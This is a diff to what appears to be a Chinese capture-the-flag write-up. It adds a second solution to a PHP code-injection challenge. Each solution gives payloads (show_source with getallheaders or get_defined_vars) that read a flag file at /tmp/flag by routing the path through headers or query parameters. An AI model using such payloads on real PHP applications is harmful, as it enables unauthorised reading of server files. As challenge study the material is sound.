@@ -8,6 +8,8 @@
 
 这里是 /tmp
 
+#### 解法一
+
 Payloads：
 
 cmd=show_source(end(getallheaders()));
@@ -15,3 +17,13 @@ cmd=show_source(end(getallheaders()));
 Flag-Path: /tmp/flag
 
 ![1763819486199](image/solve/1763819486199.png)
+
+#### 解法二
+
+Payloads：
+
+?q=/tmp/flag
+
+cmd=print_r(show_source(end(current(get_defined_vars()))));
+
+![1763820650656](image/solve/1763820650656.png)
